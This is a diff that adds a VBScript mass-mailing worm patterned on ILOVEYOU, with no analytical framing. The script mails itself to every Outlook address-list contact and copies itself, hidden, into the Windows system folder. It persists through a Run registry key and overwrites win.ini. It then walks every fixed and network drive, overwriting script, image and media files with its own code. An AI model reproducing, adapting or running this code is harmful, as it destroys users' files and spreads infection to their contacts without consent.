@@ -1,0 +1,94 @@
+On Error Resume Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set wshell = CreateObject("WScript.Shell")
+
+Set thisFile = fso.OpenTextFile(WScript.ScriptFullName, 1)
+wormCode = thisFile.ReadAll
+thisFile.Close
+
+Set outlook = Nothing
+On Error Resume Next
+Set outlook = CreateObject("Outlook.Application")
+On Error GoTo 0
+
+If Not outlook Is Nothing Then
+    Set mapi = outlook.GetNameSpace("MAPI")
+    For i = 1 To mapi.AddressLists.Count
+        Set addressList = mapi.AddressLists(i)
+        If addressList.AddressEntries.Count > 0 Then
+            For j = 1 To addressList.AddressEntries.Count
+                Set entry = addressList.AddressEntries(j)
+                email = entry.Address
+                If InStr(email, "@") Then
+                    Set mail = outlook.CreateItem(0)
+                    mail.To = email
+                    mail.Subject = "ILOVEYOU"
+                    mail.Body = "kindly check the attached LOVELETTER coming from me."
+                    mail.Attachments.Add WScript.ScriptFullName
+                    mail.Send
+                End If
+            Next
+        End If
+    Next
+End If
+
+systemFolder = wshell.ExpandEnvironmentStrings("%SystemRoot%") & "\System\"
+wormCopyPath = systemFolder & "LOVE-LETTER-FOR-YOU.TXT.vbs"
+If Not fso.FileExists(wormCopyPath) Then
+    fso.CopyFile WScript.ScriptFullName, wormCopyPath
+    Const Hidden = 2
+    Const SystemAttr = 4
+    fso.GetFile(wormCopyPath).Attributes = Hidden + SystemAttr
+End If
+
+regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\LOVELETTER"
+wshell.RegWrite regPath, wormCopyPath, "REG_SZ"
+
+winIniPath = wshell.ExpandEnvironmentStrings("%SystemRoot%") & "\win.ini"
+If fso.FileExists(winIniPath) Then
+    On Error Resume Next
+    Set winIniFile = fso.OpenTextFile(winIniPath, 2, True)
+    winIniFile.Write wormCode
+    winIniFile.Close
+    On Error GoTo 0
+End If
+
+infectExts = Array("vbs", "vbe", "js", "jse", "css", "wsh", "sct", "hta", "jpg", "jpeg", "mp2", "mp3", "mpg", "mpeg", "mp4")
+
+Const Hidden = 2
+Const SystemAttr = 4
+
+Sub InfectFolder(path)
+    Dim folder, file, subFolder, ext, infected
+    Set folder = fso.GetFolder(path)
+    For Each file In folder.Files
+        ext = LCase(fso.GetExtensionName(file.Name))
+        For Each e In infectExts
+            If ext = e Then
+                Set infected = fso.OpenTextFile(file.Path, 2, True)
+                infected.Write wormCode
+                infected.Close
+                On Error Resume Next
+                fso.GetFile(file.Path).Attributes = Hidden + SystemAttr
+                On Error GoTo 0
+                Exit For
+            End If
+        Next
+    Next
+    For Each subFolder In folder.SubFolders
+        InfectFolder subFolder.Path
+    Next
+End Sub
+
+Sub Sleep(milliseconds)
+    WScript.Sleep milliseconds
+End Sub
+
+Set drives = fso.Drives
+For Each d In drives
+    If d.DriveType = 2 Or d.DriveType = 3 Then
+        InfectFolder d.Path
+        Sleep 500
+    End If
+Next
